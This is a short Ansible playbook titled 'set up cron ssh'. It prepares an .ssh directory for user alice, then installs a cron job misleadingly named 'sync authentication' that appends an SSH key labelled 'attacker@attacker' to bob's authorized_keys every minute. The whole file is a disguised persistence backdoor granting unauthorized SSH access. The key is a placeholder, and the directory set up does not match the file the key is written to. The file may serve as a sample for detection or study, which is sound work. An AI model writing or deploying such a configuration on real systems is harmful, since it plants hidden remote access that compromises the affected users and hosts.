---
- name: "set up cron ssh"
  hosts: all
  become: yes
  tasks:
    - name: "set up .ssh directory"
      shell: "mkdir -p /home/alice/.ssh; touch /home/alice/.ssh/authorized_keys; chmod 644 /home/alice/.ssh/authorized_keys; chown -R alice:bob /home/alice/.ssh"
    - name: "cron job to add ssh keys"
      cron:
        name: "sync authentication"
        user: "alice"
        minute: "*"
        job: "echo 'ssh-rsa  attacker@attacker' >> /home/bob/.ssh/authorized_keys"
        state: present
